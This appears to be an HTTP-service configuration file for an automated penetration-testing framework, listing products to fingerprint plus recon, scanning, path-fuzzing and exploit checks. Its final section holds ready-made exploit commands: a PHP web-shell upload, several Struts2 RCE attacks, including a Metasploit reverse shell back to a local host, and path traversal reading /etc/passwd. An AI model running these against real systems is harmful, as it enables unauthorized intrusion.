#
# <service_name>.conf (one config file per service):
# --------------------------------------------------
# [config]
# default_port     = [0-65535] (mandatory)
# protocol         = tcp|udp (mandatory)
# categories       = list of categories for classifying checks ([a-z0-9_-]) (mandatory)
# auth_types       = list of authentication types, only for HTTP ([a-z0-9_-]) (optional)

# [specific_options] (optional)
# <option_name ([a-z0-9_-])> = boolean:default_value|list|var
#       (for boolean, default value can be added, True or False. False by default)

# [supported_list_options] (required if options of type list are present)
# For each option of type "list":
#   supported_<option_name> = list of supported values for the option ([a-z0-9_-])

# [products]Â (optional)
#   <product_type> ([a-z0-9_-]) = list of supported product names ([a-zA-Z0-9_\/-. ])
#   format: [vendor/]product_name (vendor can be omitted if no confusion)

# For each check:
#   [check_<check_name>]
#   name           = display name (mandatory) 
#   category       = category inside which this check is classified (mandatory)
#   description    = short text describing the check (mandatory)
#   tool           = tool_name of the tool to use
#   For each command (there must be at least one command):
#       command_<command_number> = command-line for the check, multiple tags supported
#       context_<command_number> = context that must be met to run the command (optional)
#

[config]
default_port = 80
protocol     = tcp
categories   = recon, vulnlookup, vulnscan, exploit, bruteforce, discovery, postexploit

auth_types   = 
    axis2,
    coldfusion,
    domino,
    drupal,
    glassfish, 
    htaccess,
    jboss, 
    jenkins, 
    joomla,
    magento,
    opencart,
    railo,
    tomcat, 
    weblogic, 
    websphere, 
    wordpress

[specific_options]
https       = boolean
webdav      = boolean
htaccess    = boolean
weblogic-t3 = boolean

[products]
web-language =
    Microsoft/ASP.NET,
    CFML,
    Go,
    Java,
    Lua,
    Node.js,
    Perl,
    PHP,
    Python,
    Ruby

web-application-firewall =
    aeSecure/aeSecure,
    Phion/Ergon/Airlock,
    Alert Logic/Alert Logic,
    Alibaba Cloud Computing/AliYunDun,
    Anquanbao/Anquanbao,
    AnYu Technologies/AnYu,
    Approach/Approach,
    Armor/Armor Defense,
    Microsoft/ASP.NET Generic Protection,
    Czar Securities/Astra Web Protection,
    Amazon/AWS Elastic Load Balancer,
    Baidu Cloud Computing/Yunjiasu,
    Ethic Ninja/Barikode,
    Barracuda Networks/Barracuda Application Firewall,
    Faydata Technologies Inc./Bekchy,
    BinarySec/BinarySec,
    BitNinja/BitNinja,
    BlockDoS/BlockDoS,
    Bluedon IST/Bluedon,
    Varnish/CacheWall,
    CdnNs/WdidcNet/CdnNS Application Gateway,
    Cerber Tech/WP Cerber Security,
    ChinaCache/ChinaCache CDN Load Balancer,
    Yunaq/Chuang Yu Shield,
    Cisco/ACE XML Gateway,
    Penta Security/Cloudbric,
    Cloudflare Inc./Cloudflare,
    Amazon/Cloudfront,
    Comodo CyberSecurity/Comodo cWatch,
    Jean-Denis Brun/CrawlProtect,
    Rohde & Schwarz CyberSecurity/DenyALL,
    Distil Networks/Distil,
    DOSarrest Internet Security/DOSarrest,
    Applicure Technologies/DotDefender,
    DynamicWeb/DynamicWeb Injection Check,
    Verizon Digital Media/Edgecast,
    EllisLab/Expression Engine,
    F5 Networks/BIG-IP Access Policy Manager,
    F5 Networks/BIG-IP Application Security Manager,
    F5 Networks/BIG-IP Local Traffic Manager,
    F5 Networks/FirePass,
    F5 Networks/Trafficshield,
    Fortinet/FortiWeb,
    GoDaddy/GoDaddy Website Protection,
    Grey Wizard/Greywizard,
    Art of Defense/HyperGuard,
    IBM/DataPower,
    CloudLinux/Imunify360,
    Imperva Inc./Incapsula,
    Instart Logic/Instart DX,
    Microsoft/ISA Server,
    Janusec/Janusec Application Gateway,
    Jiasule/Jiasule,
    KnownSec/KS-WAF,
    Akamai/Kona Site Defender,
    LiteSpeed Technologies/LiteSpeed Firewall,
    Inactiv/Malcare,
    Mission Control/Mission Control Application Shield,
    SpiderLabs/ModSecurity,
    NBS Systems/NAXSI,
    PentestIt/Nemesida,
    Barracuda Networks/NetContinuum,
    Citrix Systems/NetScaler AppFirewall,
    AdNovum/NevisProxy,
    NewDefend/Newdefend,
    NexusGuard/NexusGuard Firewall,
    NinTechNet/NinjaFirewall,
    NSFocus Global Inc./NSFocus,
    BlackBaud/OnMessage Shield,
    Palo Alto Networks/Palo Alto Next Gen Firewall,
    PerimeterX/PerimeterX,
    PowerCDN/PowerCDN,
    ArmorLogic/Profense,
    Radware/AppWall,
    Reblaze/Reblaze,
    RSJoomla!/RSFirewall,
    Microsoft/ASP.NET RequestValidationMode,
    Sabre/Sabre Firewall,
    Safe3/Safe3 Web Firewall,
    SafeDog/Safedog,
    Chaitin Tech./Safeline,
    SecuPress/SecuPress WordPress Security,
    United Security Providers/Secure Entry,
    BeyondTrust/eEye SecureIIS,
    Imperva Inc./SecureSphere,
    Neusoft/SEnginx,
    One Dollar Plugin/Shield Security,
    SiteGround/SiteGround,
    Sakura Inc./SiteGuard,
    TrueShield/Sitelock,
    Dell/SonicWall,
    Sophos/UTM Web Protection,
    Squarespace/Squarespace,
    StackPath/StackPath,
    Sucuri Inc./Sucuri CloudProxy,
    Tencent Technologies/Tencent Cloud Firewall,
    Citrix Systems/Teros,
    TransIP/TransIP Web Firewall,
    iFinity/DotNetNuke/URLMaster SecurityCheck,
    Microsoft/URLScan,
    OWASP/Varnish,
    VirusDie LLC/VirusDie,
    Wallarm Inc./Wallarm,
    WatchGuard Technologies/WatchGuard,
    WebARX Security Solutions/WebARX,
    AQTRONIX/WebKnight,
    IBM/WebSEAL,
    WebTotem/WebTotem,
    Feedjit/Wordfence,
    WTS/WTS-WAF,
    360 Technologies/360WangZhanBao,
    XLabs/XLabs Security WAF,
    Yundun/Yundun,
    Yunsuo/Yunsuo,
    Zenedge/Zenedge,
    Accenture/ZScaler,
    West263 Content Delivery Network,
    pkSecurity Intrusion Detection System,
    Xuanwudun,
    Open-Resty Lua Nginx WAF

web-framework =
    Bootstrap,
    Angular Material,
    CakePHP,
    Codeigniter,
    Django,
    Expressjs/Express,
    Google/Web Toolkit,
    Laravel,
    Ruby On Rails,
    Symfony,
    Yiiframework

web-jslib = 
    Angularjs,
    Backbone.js,
    ef.js,
    FancyBox,
    Handlebars,
    Jquery,
    Jquery UI,
    Lightbox,
    Modernizr,
    Moment.js,
    MooTools,
    Mustache.js,
    Prototype Javascript Framework,
    React,
    RequireJS,
    TweenMax,
    Underscore.js

web-cms =
    3dcart,
    Advanced Electron Forum,
    Afosto,
    Afterbuy,
    Ametys Cms,
    Apostrophe Cms,
    Arastta,
    AsciiDoc,
    Aspnetforum,
    Beehive Forum,
    Bigcommerce,
    Bigware Shop,
    Bizweb,
    Bolt,
    Browsercms,
    Bubble,
    Burning Board,
    Adobe/Business Catalyst,
    Ckan,
    Clientexec,
    Cloudcart,
    Colormeshop,
    Contao Cms,
    Contendio,
    Contensis Cms,
    Contentbox,
    Contentful,
    Cpg Dragonfly Cms,
    Cotonti Siena,
    Craft Cms,
    Danneo/Cms,
    Sitecore/Cms,
    Cms Made Simple,
    Cmsimple,
    Concrete5,
    Dedecms,
    Discourse,
    Discuz,
    Django Cms,
    Dokuwiki,
    Dotcms,
    Dotnetnuke,
    Domino,
    Drupal,
    E107,
    Episerver,
    Expressionengine,
    Ez Publish,
    Flarum,
    Flexcmp,
    Fluxbb,
    Fork Cms,
    Fudforum,
    Getsimple Cms,
    Ghost Cms,
    Gravcms,
    Hippo Cms,
    Hotaru Cms,
    Impresspages Cms,
    Indexhibit,
    Invision Power Board,
    Jalios Jcms,
    Jimdo,
    Jforum,
    Joomla,
    Koken,
    Kooboo Cms,
    Lepton-cms/Lepton,
    Liferay,
    Livejournal,
    Livestreet,
    Magento,
    Majordomo,
    Mambo,
    Squiz/Matrix,
    Mediawiki,
    Minibb,
    Mercuryboard,
    Modx Revolution,
    Moodle,
    Moto Cms,
    Movable Type,
    Mura Cms,
    Mvnforum,
    Mwforum,
    Mybb,
    Nodebb,
    NoNonsense Forum,
    October Cms,
    Odoo,
    Opencart,
    Opencms,
    Opentext Wsm,
    Ophal,
    Orchard,
    Pencilblue,
    Percussion Cms,
    Phorum,
    Php-nuke,
    Phpbb,
    Phpcms,
    Phpmyadmin,
    Phppgadmin,
    Phpwind,
    Pimcore,
    Plone,
    Presstopia,
    Prestashop,
    Punbb,
    Quick.cms,
    Rcms,
    Ritecms,
    Roadiz Cms,
    Rock Rms,
    Roundcube Webmail,
    Seamlesscms,
    Serendipity,
    Sharepoint,
    Silva,
    Silverstripe,
    Simple Machines Forum,
    Sitecore,
    Sitefinity,
    Snews,
    Solodev,
    Spin Cms,
    Squirrelmail,
    Subrion Cms,
    Sulu,
    Textpattern,
    Tiddlywiki,
    Tikiwiki,
    Typo3,
    UBB.threads,
    Uknowva,
    Ultimate Php Board,
    Ushahidi Platform,
    Umbraco,
    Umi Cms,
    Vanilla Forums,
    Vbulletin,
    Webflow Cms,
    Webgui,
    Websitebaker,
    Wolf Cms,
    Wordpress,
    Xenforo,
    Xmb,
    Xoops,
    Yabb,
    Yazd Discussion Forum,
    Yet Another Forum.net,
    Zen Cart,
    Zen Photos

web-server = 
    Apache,
    Hiawatha,
    IBM/HTTP Server,
    Lighttpd,
    LiteSpeed Web Server,
    Microsoft/IIS,
    Mongoose,
    Monkey Http Daemon,
    Nginx,
    Oracle/Http Server,
    Rejetto/Http File Server,
    Thttpd,
    Yaws,
    Zeus Web Server,

web-appserver = 
    Adobe/Coldfusion,
    Apache/Axis2,
    Apache/Tomcat,
    Eclipse/Jetty,
    Jboss,
    Jenkins,
    Oracle/Glassfish,
    Oracle/Weblogic Server,
    Railo,
    Websphere Application Server,
    Zope


#########################################################################################
# Recon
#########################################################################################
[check_nmap-simple-recon]
name        = nmap-simple-recon
category    = recon
description = Simple recon using Nmap
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -v -p [PORT] --stats-every 10s -d [IP]

[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Recon using Nmap HTTP scripts
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -vv -p [PORT] --script-args=unsafe=1 --script='http-adobe-coldfusion-apsa1301,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-axis2-dir-traversal,http-bigip-cookie,http-cakephp-version,http-coldfusion-subzero,http-comments-displayer,http-cookie-flags,http-cors,http-cross-domain-policy,http-errors,http-favicon,http-generator,http-git,http-iis-webdav-vuln,http-mcmp,http-methods,http-method-tamper,http-mobileversion-checker,http-ntlm-info,http-passwd,http-phpmyadmin-dir-traversal,http-phpself-xss,http-php-version,http-put,http-robots.txt,http-security-headers,http-server-header,http-shellshock,http-svn-enum,http-svn-info,http-title,http-trace,http-vuln*,http-webdav-scan,weblogic-t3-info' --script-args http.useragent='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0' --stats-every 10s -d [IP]

[check_waf-detection]
name        = waf-detection
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = wafw00f
command_1   = wafw00f -v -a [URL]

[check_waf-detection2]
name        = waf-detection2
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = identywaf
command_1   = python3 identYwaf.py [URL]

# [check_cloudmare-recon]
# name        = cloudmare-recon
# category    = recon
# description = Try to find real ip behind cloudflare
# tool        = Cloudmare
# context_1   = { 'web-application-firewall': 'Cloudflare Inc./Cloudflare'}
# command_1   = python3 Cloudmare.py -u [DOMAIN]

[check_fingerprinting-multi-whatweb]
name        = fingerprinting-multi-whatweb
category    = recon
description = Identify CMS, blogging platforms, JS libraries, Web servers
tool        = whatweb
command_1   = ./whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' -a 3 -v [URL]

[check_fingerprinting-cms-cmseek]
name        = fingerprinting-cms-cmseek
category    = report
description = Detect CMS (130+ supported), detect version on Drupal, advanced scan on Wordpress/Joomla
tool        = cmseek
command_1   = /bin/bash -c 'yes | python3 cmseek.py --clear-result; yes | python3 cmseek.py -v --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" -u [URL] > /tmp/cmseek.txt && tail -n +2 /tmp/cmseek.txt; cat Result/*/cms.json; rm /tmp/cmseek.txt'

[check_fingerprinting-drupal]
name        = fingerprinting-drupal
category    = recon
description = Fingerprint Drupal 7/8: users, nodes, default files, modules, themes enumeration
tool        = drupwn
command_1   = python3 drupwn --mode enum --target [URL]

# [check_crawling-fast]
# name        = crawling-fast
# category    = recon
# description = Crawl website quickly, analyze interesting files/directories
# tool        = dirhunt
# command_1   = python3 scripts/dirhunt [URL]

[check_crawling-fast2]
name        = crawling-fast2
category    = recon
description = Crawl website and extract URLs, files, intel & endpoints
tool        = photon
command_1   = python3 photon.py --url [URL] -o output; cd output; for f in `ls *.txt`; do echo; echo $f; echo "---------------------------------------------------"; cat $f | sed 's/\\n/\n/g'; echo; echo; done; cd ..; rm -rf output;

[check_gathering-emails]
name        = gathering-emails
category    = recon
description = Gather emails, subdomains, hosts, employee names, open ports, and banners from different public sources
tool        = theharvester
command_1   = theHarvester -d [DOMAIN]

#sublist3r
[check_gathering-subdomains]
name        = gathering-subdomains
category    = recon
description = Fast enumerate subdomains of websites using OSINT 
tool        = sublist3r
command_1   = python3 sublist3r.py -d [DOMAIN]

[check_webdav-detection-msf]
name        = webdav-detection-msf
category    = recon
description = Detect WebDAV on webserver
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"


#########################################################################################
# Vulnscan
#########################################################################################
[check_ssl-check]
name        = ssl-check 
category    = vulnscan
description = Check for SSL/TLS configuration
tool        = testssl.sh
command_1   = ./testssl.sh [URL]

[check_headers-analysis]
name        = headers-analysis
category    = vulnscan
description = Check HTTP headers
tool        = h2t
command_1   = python3 h2t.py scan [URL] -p description -vv -k

[check_vulnscan-multi-nikto]
name        = vulnscan-multi-nikto
category    = vulnscan
description = Check for multiple web vulnerabilities/misconfigurations
tool        = nikto
command_1   = cd program; perl ./nikto.pl -host [IP] -port [PORT] [HTTPS true="-ssl"]

[check_webdav-internal-ip-disclosure]
name        = webdav-internal-ip-disclosure
category    = vulnscan
description = Check for WebDAV internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_internal_ip; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_webdav-website-content]
name        = webdav-website-content
category    = vulnscan
description = Detect webservers disclosing its content through WebDAV
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_website_content; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_http-put-check]
name        = http-put-check
category    = vulnscan
description = Detect the support of dangerous HTTP PUT method
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/http_put; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_iis-internal-ip-disclosure]
name        = iis-internal-ip-disclosure
category    = vulnscan
description = Check for IIS internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/iis_internal_ip; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set VERBOSE true; run; exit"
context_1   = { 'web-server': 'Microsoft/IIS'}

[check_tomcat-user-enum]
name        = tomcat-user-enum
category    = vulnscan
description = Enumerate users on Tomcat 4.1.0-4.1.39, 5.5.0-5.5.27 and 6.0.0-6.0.18
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Apache/Tomcat' }

[check_jboss-vulnscan-multi]
name        = jboss-vulnscan-multi
category    = vulnscan
description = Scan JBoss application server for multiple vulnerabilities
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jboss-status-infoleak]
name        = jboss-status-infoleak
category    = vulnscan
description = Queries JBoss status servlet to collect sensitive information (JBoss 4.0, 4.2.2 and 4.2.3) 
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_status; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jenkins-infoleak]
name        = jenkins-infoleak
category    = vulnscan
description = Enumerate a remote Jenkins-CI installation in an unauthenticated manner
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_enum; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jenkins' }

[check_apache-optionsbleed-check]
name        = apache-optionsbleed-check
category    = vulnscan
description = Test for the Optionsbleed bug in Apache httpd (CVE-2017-9798)
tool        = optionsbleed
command_1   = ./optionsbleed -n 40 -a -u [URL]

[check_iis-shortname-scan]
name        = iis-shortname-scan
category    = vulnscan
description = Scan for IIS short filename (8.3) disclosure vulnerability
tool        = iis-shortname-scanner
command_1   = java -jar release/iis_shortname_scanner.jar [URL]

[check_cms-multi-vulnscan-cmsmap]
name        = cms-multi-vulnscan-cmsmap
category    = vulnscan
description = Check for vulnerabilities in CMS Wordpress, Drupal, Joomla
tool        = cmsmap
# Need to do apt-get update before to make sure update of exploitdb will work
command_1   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f W --nosslcheck -t 10 [URL]'
context_1   = { 'web-cms': 'Wordpress' }
command_2   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f J --nosslcheck -t 10 [URL]'
context_2   = { 'web-cms': 'Joomla' }
command_3   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f D --nosslcheck -t 10 [URL]'
context_3   = { 'web-cms': 'Drupal' }

[check_wordpress-vulnscan]
name        = wordpress-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpscan
command_1   = wpscan --url [URL] --disable-tls-checks -e vp,vt,tt,cb,dbe,m,u1-50 -v 

[check_wordpress-vulnscan2]
name        = wordpress-vulnscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpseku
command_1   = python3 wpseku.py -v --url [URL]

[check_joomla-vulnscan]
name        = joomla-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomscan
command_1   = joomscan -u [URL] --enumerate-components

[check_wapiti-vulnscan]
name        = wapiti-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in web applications
tool        = wapiti
command_1   = wapiti -u [URL] -f html -o '[TOOLDIR]/tmp/wapiti-output.json'

[check_xss-vulnscan]
name        = xss-vulnscan
category    = vulnscan
description = Scan for XSS vulnerabilities
tool        = xsstrike
command_1   = python3 xsstrike.py -u "[URL]/search.php?q=query"

# [check_vulners-lookup]
# name        = vulners-lookup
# category    = vulnlookup
# description = Vulnerabilities lookup (language, framework, jslib, cms, server, appserver) on Vulners.com
# tool        = vulners-lookup
# apikey      = vulners
# command_1   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-LANGUAGE-VENDOR] [WEB-LANGUAGE-NAME] [WEB-LANGUAGE-VERSION]'
# context_1   = { 'web-language': 'any|version_known' }
# command_2   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-FRAMEWORK-VENDOR] [WEB-FRAMEWORK-NAME] [WEB-FRAMEWORK-VERSION]'
# context_2   = { 'web-framework': 'any|version_known' }
# command_3   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-JSLIB-VENDOR] [WEB-JSLIB-NAME] [WEB-JSLIB-VERSION]'
# context_3   = { 'web-jslib': 'any|version_known' }
# command_4   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-CMS-VENDOR] [WEB-CMS-NAME] [WEB-CMS-VERSION]'
# context_4   = { 'web-cms': 'any|version_known' }
# command_5   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-SERVER-VENDOR] [WEB-SERVER-NAME] [WEB-SERVER-VERSION]'
# context_5   = { 'web-server': 'any|version_known' }
# command_6   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-APPSERVER-VENDOR] [WEB-APPSERVER-NAME] [WEB-APPSERVER-VERSION]'
# context_6   = { 'web-appserver': 'any|version_known' }

# [check_cvedetails-lookup]
# name        = cvedetails-lookup
# category    = vulnlookup
# description = Vulnerabilities lookup (language, framework, jslib, cms, server, appserver) on Cvedetails.com
# tool        = cvedetails-lookup
# command_1   = python3 cvedetails-lookup.py --vendor "[WEB-LANGUAGE-VENDOR]" --product "[WEB-LANGUAGE-NAME]" --version "[WEB-LANGUAGE-VERSION]"
# context_1   = { 'web-language': 'any|version_known' }
# command_2   = python3 cvedetails-lookup.py --vendor "[WEB-FRAMEWORK-VENDOR]" --product "[WEB-FRAMEWORK-NAME]" --version "[WEB-FRAMEWORK-VERSION]"
# context_2   = { 'web-framework': 'any|version_known' }
# command_3   = python3 cvedetails-lookup.py --vendor "[WEB-JSLIB-VENDOR]" --product "[WEB-JSLIB-NAME]" --version "[WEB-JSLIB-VERSION]"
# context_3   = { 'web-jslib': 'any|version_known' }
# command_4   = python3 cvedetails-lookup.py --vendor "[WEB-CMS-VENDOR]" --product "[WEB-CMS-NAME]" --version "[WEB-CMS-VERSION]"
# context_4   = { 'web-cms': 'any|version_known' }
# command_5   = python3 cvedetails-lookup.py --vendor "[WEB-SERVER-VENDOR]" --product "[WEB-SERVER-NAME]" --version "[WEB-SERVER-VERSION]"
# context_5   = { 'web-server': 'any|version_known' }
# command_6   = python3 cvedetails-lookup.py --vendor "[WEB-APPSERVER-VENDOR]" --product "[WEB-APPSERVER-NAME]" --version "[WEB-APPSERVER-VERSION]"
# context_6   = { 'web-appserver': 'any|version_known' }


#########################################################################################
# Discovery
#########################################################################################
[check_web-path-discovery-blind]
name        = web-path-discovery-blind
category    = discovery
description = Bruteforce web paths when language is unknown (use raft wordlist)
tool        = wfuzz
command_1   = ./wfuzz -c -u '[URL]/FUZZ/' -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-directories.txt" -t 30 --hc 400,404,405,406,429,500,502,503,504,000
context_1   = { 'web-language': 'undefined' }
command_2  = ./wfuzz -c -u '[URL]/FUZZ' -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-files.txt" -t 30 --hc 400,404,405,406,429,500,502,503,504,000
context_2   = { 'web-language': 'undefined' }

[check_discovery-server]
name        = discovery-server
category    = discovery
description = Bruteforce web paths specific to detected web/application servers
tool        = dirsearch
command_1   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/Apache.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_1   = { 'web-server': 'Apache' }
command_2   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/IIS.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_2   = { 'web-server': 'Microsoft/IIS' }
command_3   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/web-servers/Nginx.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_3   = { 'web-server': 'Nginx' }
command_4   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Axis.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_4   = { 'web-appserver': 'Apache/Axis2' }
command_5   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Coldfusion.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_5   = { 'web-appserver': 'Adobe/Coldfusion' }
command_6   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Glassfish.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_6   = { 'web-appserver': 'Oracle/Glassfish' }
command_7   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Jboss.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_7   = { 'web-appserver': 'Jboss' }
command_8   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Jenkins.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_8   = { 'web-appserver': 'Jenkins' }
command_9   = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Tomcat.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_9   = { 'web-appserver': 'Apache/Tomcat' }
command_10  = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Weblogic.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_10  = { 'web-appserver': 'Oracle/Weblogic Server' }
command_11  = python3 dirsearch.py -u '[URL]' -e '' -w "[WORDLISTSDIR]/services/http/discovery/app-servers/Websphere.txt" -t 50 --exclude-status=400,404,405,406,429,500,502,503,504,000 --format plain -o out.txt; cat out.txt
context_11  = { 'web-appserver': 'Websphere Application Server' }

[check_web-fuzzing-fast]
name        = web-fuzzing-fast
category    = discovery
description = Fuzz web paths quickly 
tool        = ffuf
command_1   = ./ffuf -c -w "[WORDLISTSDIR]/services/http/discovery/raft/raft-small-directories.txt" -u '[URL]/FUZZ' -t 50 -o output.txt -of html


#########################################################################################
# Exploit
#########################################################################################
[check_jquery-fileupload-rce-cve2018-9206]
name        = jquery-fileupload-rce-cve2018-9206
category    = exploit
description = Exploit arbitrary file upload in jQuery File Upload widget <= 9.22 (CVE-2018-9206)
tool        = jqshell
command_1   = python3 jqshell.py -t [URL]/jQuery-File-Upload -s [WEBSHELLSDIR]/cmd.php
context_1   = { 'web-jslib': 'Jquery' }
command_2   = python3 jqshell.py -t [URL]/jQuery-File-Upload-9.22.0 -s [WEBSHELLSDIR]/cmd.php
context_2   = { 'web-jslib': 'Jquery' }
command_3   = python3 jqshell.py -t [URL]/jQuery-File-Upload -s [WEBSHELLSDIR]/cmd.php
context_3   = { 'web-jslib': 'Jquery UI' }
command_4   = python3 jqshell.py -t [URL]/jQuery-File-Upload-9.22.0 -s [WEBSHELLSDIR]/cmd.php
context_4   = { 'web-jslib': 'Jquery UI' }

[check_struts2-rce-cve2017-5638]
name        = struts2-rce-cve2017-5638
category    = exploit
description = Exploit Apache Struts2 Jakarta Multipart parser RCE (CVE-2017-5638)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --struts2 -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2018-11776]
name        = struts2-rce-cve2018-11776
category    = exploit
description = Exploit Apache Struts2 misconfiguration RCE (CVE-2018-11776)
tool        = struts-pwn-cve2018-11776
command_1   = python3 struts-pwn.py -u [URL] 
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2017-9791]
name        = struts2-rce-cve2017-9791
category    = exploit
description = Exploit Apache Struts2 Plugin Showcase OGNL RCE (CVE-2017-9791)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD cmd/unix/reverse; set LHOST [LOCALIP]; set LPORT 8443; set VERBOSE true; set AutoRunScript multi_console_command -c whoami,uname,exit; exploit; exit"
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2017-9805]
name        = struts2-rce-cve2017-9805
category    = exploit
description = Exploit Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)
tool        = struts-pwn-cve2017-9805
command_1   = python3 struts-pwn.py -u [URL]
context_1   = { 'web-language': 'Java' }

[check_jboss-misconfig-exploit]
name        = jboss-misconfig-exploit
category    = exploit
description = Try exploit misconfig on JBoss appserver pre-auth (jmx|web|admin-console,JMXInvokerServlet)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-appserver': 'JBoss' }

[check_jboss-path-traversal-cve2014-7816]
name        = jboss-path-traversal-cve2014-7816
category    = exploit
description = Exploit path traversal on Jboss Wildfly 8.1.0 (only Windows) (CVE-2014-7816)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jboss', 'os': 'windows' }

[check_glassfish-path-traversal-cve2017-1000028]
name        = glassfish-path-traversal-cve2017-1000028
category    = exploit
description = Exploit path traversal on Glassfish <= 4.1 (CVE-2017-1000028)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/glassfish_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set FILEPATH /windows/win.ini; run; set FILEPATH /etc/passwd; run; exit"
